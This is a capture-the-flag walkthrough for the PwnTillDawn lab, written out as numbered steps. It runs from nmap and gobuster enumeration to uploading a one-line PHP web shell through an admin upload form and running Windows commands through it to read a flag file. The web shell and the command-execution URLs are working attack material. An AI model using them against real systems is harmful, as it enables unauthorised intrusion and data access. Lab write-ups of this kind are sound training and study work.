# Walkthrough: PwnTillDawn – Flag 1

## Step 1: VPN Connection

To begin the assessment, I connected to the PwnTillDawn environment using OpenVPN with the provided configuration file:

`sudo openvpn PwnTillDawn.ovpn`

This established secure access to the target network.

## Step 2: Network Discovery

The assigned network range was **10.150.150.10 – 10.150.150.254**. To identify active hosts within this range, I performed a ping sweep using Nmap:

`nmap -sn 10.150.150.10-254`

The scan identified a live host at **10.150.150.11**.

## Step 3: Service and Port Enumeration

Next, I conducted a service and version scan against the discovered host:

`nmap -sC -sV -Pn 10.150.150.11`

The scan revealed several open ports, including **port 80 (HTTP)**, indicating the presence of a web server. The results also suggested that the target was running a **Windows operating system**.

## Step 4: Directory Enumeration

To discover hidden directories and files on the web server, I used Gobuster with a common wordlist:

`gobuster dir -u http://10.150.150.11/ -w /usr/share/wordlists/dirb/common.txt`

The scan identified several accessible directories, including:

* `/admin`
* `/upload`

These directories appeared to be of particular interest for further investigation.

## Step 5: Administrative Interface Access

I accessed the administrative portal through a web browser:

`http://10.150.150.11/admin`

During the assessment of the portal, I identified a file upload functionality that could potentially be leveraged for further testing.

## Step 6: Web Shell Deployment

To evaluate the security of the file upload feature, I created a simple PHP web shell:

`echo '<?php system($_GET["cmd"]); ?>' > cmd.php`

The file was then uploaded through the web application's upload mechanism.

## Step 7: Remote Command Execution Verification

After uploading the file, I accessed it through the browser and executed a test command:

`http://10.150.150.11/upload/16/cmd.php?cmd=whoami`

The successful response confirmed that remote command execution was possible through the uploaded file.

## Step 8: Flag Discovery

Using the command execution capability, I enumerated the contents of the Administrator's Desktop directory:

`?cmd=dir C:\Users\Administrator\Desktop`

This revealed the presence of a file named **FLAG1.txt**.

## Step 9: Flag Retrieval

Finally, I displayed the contents of the flag file using the following command:

`?cmd=type C:\Users\Administrator\Desktop\FLAG1.txt`

The flag was successfully retrieved, completing the objective of the challenge.
